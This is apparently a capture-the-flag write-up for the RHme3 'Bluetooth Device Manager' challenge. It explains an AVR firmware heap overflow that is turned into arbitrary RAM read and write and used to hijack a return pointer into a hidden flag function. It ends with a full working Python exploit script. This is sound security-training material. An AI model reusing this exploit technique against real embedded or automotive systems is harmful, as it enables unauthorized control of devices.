# [Bluetooth Device Manager](https://rhme.riscure.com/3/challenge?id=20)

Exploitation - 200pts

In addition to the challenge binary, an unencrypted binary is included for reverse engineering.

## Challenge text

You have a basic car model and would like to enable some extra features? That navigation with traffic should be neat. Right. It is expensive, you know. Or not, if you can access the control interface. Try bluetooth this time. We think, it could be used for purposes other than making calls and playing MP3s.

## Solution

### Solution overview

The solution to this challenge involves a heap exploit initiated by a buffer overflow.  The exploit is used to overwrite a return pointer to redirect execution into a hidden function.  The hidden function has several mitigations to be overcome as well.  Countering the mitigations and redirecting execution is made possible by operationalizing the heap exploit into a reusable tool for reading and writing multiple locations in RAM.

### Static analysis

Disassemble the unencrypted binary as follows:

	$ avr-objcopy -I ihex -O elf32-avr bluetooth_device_manager.hex bluetooth_device_manager.elf
	$ avr-objdump -D bluetooth_device_manager.elf > bluetooth_device_manager.asm

Text section (by flash address|by PC address):

	Range 0x0000 to 0x2DCF|0x16E7
	0x0226|0x0113: init()
	0x0276|0x013B: get_input()
	0x0304|0x0182: control_interface()
	0x04C6|0x0263: connect_device()
	0x06B8|0x035C: disconnect_device()
	0x07D6|0x03EB: print_devices()
	0x08EC|0x0476: modify_device()
	0x0A8C|0x0546: main()
	0x0E24|0x0712: fputc()
	0x0EE8|0x0774: print()
	0x2DCC|0x16E6: halt()

Data section (by RAM address):

	Static range 0x2000 to 0x218E
	Dynamic range 0x218F to 0x3FFF
	0x2000: 0xDEAD
	0x2002: 0xBEEF
	0x2004: pointer to 0x08A0 (USARTC0)
	0x2006: pointer to 0x0640 (PORTC)
	0x2008: 0x0804
	0x200A: USARTC0 handle
	0x200C: pointer to 0x09B0 (USARTD1)
	0x200E: pointer to 0x0660 (PORTD)
	0x2010: 0x8040
	0x2012: USARTD1 handle
	0x201A: "such heap, much pr0!\n"
	0x2030: "why you pivot?\n"
	0x2040: "Your flag: "
	0x204C: "\n"
	0x204E: "Enter device name: \n"
	0x2063: "Enter pairing key: \n"
	0x2078: "Error: Could not find device with this id!\n"
	0x20A4: "%d. name: %s, key: %s\n"
	0x20BB: "%d. %s, %s\n"
	0x20C7: "Enter new name: "
	0x20D8: "Enter new key: "
	0x20E8: "Choose one of the following: \n"
	0x2107: "1. Print all connected devices\n"
	0x2127: "2. Connect new device\n"
	0x213E: "3. Disconnect device\n"
	0x2154: "4. Modify stored device\n"
	0x216D: "5. Exit\n"
	0x2176: "Enter number of device: "

The function at 0x0304|0x0182 is not called from anywhere.  It looks like it gives us the flag and is likely the control interface mentioned in the challenge text, so I'll call it control_interface().  I assume that our goal is to redirect execution to this function.

The string "such heap, much pr0!\n" is printed by control_interface(), so I assume that this challenge involves a heap exploit.

It looks as if control_interface() includes several checks that must be passed in order to get the flag:
* Check 1: The value at 0x2000 should be 0xFOOD.  The default value is 0xDEAD.
* Check 2: The value at 0x2192 should be the current frame pointer + 1.  Dynamic analysis provides insight regarding how to accomplish this (read more below).
* Check 3: The value at 0x2002 should be 0xBAAD.  The default value is 0xBEEF.

### Dynamic analysis

The following was accomplished by debugging the unencrypted binary using the hardware debugging configuration described in the [Debugging AVR XMEGA raw binaries](../Preparation/debugging_raw_binaries.md) guide.

Dynamic analysis reveals more information about how to pass the second check in control_interface():
* The correct check value in 0x2192 is ensured by entering control_interface() at PC address 0x0185.  This is accomplished by overwriting the return pointer of modify_device() with 0x0185.  Also note that unlike all other word values, return pointers should be big endian.
* The stack is randomized, so the location of the return pointer of modify_device() is not at a fixed address.  However, we can calculate this on the fly as: return_pointer = *(0x2192) - 2.

A heap is used starting at 0x225D.  Each device is represented in the heap using a master record and two strings.  Each master record is structured as follows:

	typedef struct {
		uint8         device_num;
		uint16        name_len;
		uint16        key_len;
		char          *name_ptr;
		char          *key_ptr;
		DEVICE_MASTER *next;
	} DEVICE_MASTER;

Each record in the heap, both master records and strings, consist of a two byte record length preceeding the actual record.  These prefix lengths are only used for tracking record sizes when deleted record are coalesced into bigger unused records.  The true field lengths for device names and pairing keys are stored in the master records.

Here's an example of what the heap looks like after adding three devices:

	       0x225D:       a6 22 00 00
	0x2261|0x2263: 04 00|69 22 93 22
	0x2267|0x2269: 0b 00|00 02 00 02 00 76 22 7a 22 7e 22  Master record for device 0
	0x2274|0x2276: 02 00|41 00                             Name: "A"
	0x2278|0x227A: 02 00|31 00                             Pairing key: "1"
	0x227C|0x227E: 0b 00|01 02 00 02 00 8b 22 8f 22 93 22  Master record for device 1
	0x2289|0x228B: 02 00|42 00                             Name: "B"
	0x228D|0x228F: 02 00|32 00                             Pairing key: "2"
	0x2291|0x2293: 0b 00|02 02 00 02 00 a0 22 a4 22 00 00  Master record for device 2
	0x229E|0x22A0: 02 00|43 00                             Name: "C"
	0x22A2|0x22A4: 02 00|33 00                             Pairing key: "3"

Here's a breakdown of the master record for device 0 in the example above:

	device_num =   0x00
	name_len =   0x0002
	key_len =    0x0002
	name_ptr =   0x2276
	key_ptr =    0x227a
	next =       0x227e

Our goal is to overwrite the lengths and pointers for the device name and pairing key within one of the master records, and then use those to read and write arbitrary locations in RAM.

A bug allows for any device name or pairing key to be replaced with a string two bytes larger when choosing to modify a device through the main menu.  The larger string will overwrite the heap record size prefix of the heap record following the updated string.

### Attack

The bug itself is very simple, and not much can be done with it initially.  The following process will amplify the bug into an operational exploit:
* Add three Bluetooth devices (0 thru 2).
* Modify the name of device 0 to overwrite the recovery size of device 0's pairing key.
* Delete device 0.  The heap manager will coalesce all of device 0's fields and miscalculate the free space available for the combined field.
* Connect another device.  The oversized unused field will be used, but starting from the end of the oversized record, overlapping the master record for device 1.
* Determine the new device number for device 1 (e.g. device 34).
* Modify device 34 as needed to overwrite the field sizes and pointers for device 2.
* Modify device 2 to read and write arbitrary locations in RAM.
* Repeat the last two steps as needed.

A fully exploited heap looks as follows.  In this heap, device 34 at 0x227E controls field sizes and pointers within device 2, and device 2 at 0x2293 is used to read and write arbitrary locations in RAM.  Square brackets indicate overlapping areas.

	       0x225D:       a6 22 67 22
	0x2261|0x2263: 04 00|7e 22 78 22
	0x2267|0x2269: 05 00|00 00 00 02 00
	0x226E|0x2270: 02 00|34 00
	0x2272|0x2274: 02 00|44 00
	0x2276|0x2278: 0b 00|03 02 00 02[00 74 22 70 22 00 00]
	0x227C|0x227E: 00 74|22 70 22 00 00 8b 22 8f 22 93 22
	0x2289|0x228B: 02 00|58 58[58 58 00 58 0b 58 02 58 58 58 58 df 3d 00]
	0x228D|0x228F: 58 58|00 58
	0x2291|0x2293: 0b 58|02 58 58 58 58 df 3d 00 20 93 22
	0x229E|0x22A0: 02 00|43 00
	0x22A2|0x22A4: 02 00|33 00

Before using an exploited heap, there are a few things worth mentioning:
* The act of reading a value will erase it, so you may want to write it back out.
* Null bytes can be included in strings.
* The act of writing a value will include a null byte string terminator.  This may clobber something important.  This can be fixed by writing out more than needed until a good spot for a null byte is reached.

The following Python3 script implements the attack and gets the flag:

	import serial
	import re

	port = 'COM42'
	rate = 115200

	s = serial.Serial(port,rate,timeout=3.0,write_timeout=3.0,inter_byte_timeout=3.0)

	def print_b(message):
		print(message.decode(encoding='ascii',errors='ignore'))

	def read_until(match=b''):
		message = bytearray()
		while (True):
			data = s.read(1)
			if (len(data) == 0):
				break
			message += data
			if (len(match) > 0 and match in message):
				break
		print_b(message)
		return message

	def write(line):
		line = bytearray(line)
		line.extend(b'\n')
		s.write(line)

	def connect_device(name,key):
		write(b'2')
		read_until(b'Enter device name: \n')
		write(name)
		read_until(b'Enter pairing key: \n')
		write(key)
		read_until(b'5. Exit\n')

	def disconnect_device(number):
		write(b'3')
		read_until(b'Enter number of device: ')
		write(number)
		read_until(b'5. Exit\n')

	def modify_device(number,name,key):
		write(b'4')
		read_until(b'Enter number of device: ')
		write(number)
		read_until(b'Enter new name: ')
		write(name)
		read_until(b'Enter new key: ')
		write(key)
		return read_until(b'5. Exit\n')

	flag_pattern = re.compile(b'Your flag: (.+)')

	def check_for_flag(message):
		result = flag_pattern.search(message)
		if (result):
			flag = result.group(1)
			print(''.join([format(a,'02x') for a in flag]))

	name_pattern = re.compile(b'^\d{1,2}\. (.*), ([^\n]*)',re.M)

	def probe_device(number):
		write(b'4')
		read_until(b'Enter number of device: ')
		write(number)
		device_info = read_until(b'Enter new name: ')
		result = name_pattern.search(device_info)
		device_name = result.group(1)
		device_key = result.group(2)
		# The act of reading values erases them, so write them back out.
		write(device_name)
		read_until(b'Enter new key: ')
		write(device_key)
		read_until(b'5. Exit\n')
		return device_name

	# We need three initial devices (0 thru 2) for this attack.
	connect_device(b'A',b'1')
	connect_device(b'B',b'2')
	connect_device(b'C',b'3')

	# Corrupt the size fields to prepare to overlap a control record.
	modify_device(b'0',b'AA\x09',b'')
	disconnect_device(b'0')
	connect_device(b'D',b'4')

	# Craft the overlap.
	control = bytearray(b'XXXXXX\x0bX\x02XXXXZZ\x00\x22\x93\x22\x02')

	# Read the value in 0x2192.
	control[13] = 0x92
	control[14] = 0x21
	modify_device(b'34',control,b'')
	data = probe_device(b'2')

	# Take aim.
	control[13] = (data[0] - 2) % 256
	if (data[0] - 2 < 0):
		control[14] = data[1] - 1
	else:
		control[14] = data[1]
	control[16] = 0x20
	modify_device(b'34',control,b'')

	# Write out the payloads.  Write more than needed to land the null byte string terminator in a safe spot.
	check_for_flag(modify_device(b'2',b'\x01\x85',b'\x0D\xF0\xAD\xBA\xA0\x08\x40\x06\x04\x08\x04\x20\xB0\x09\x60\x06\x40\x80\x0C\x20'))
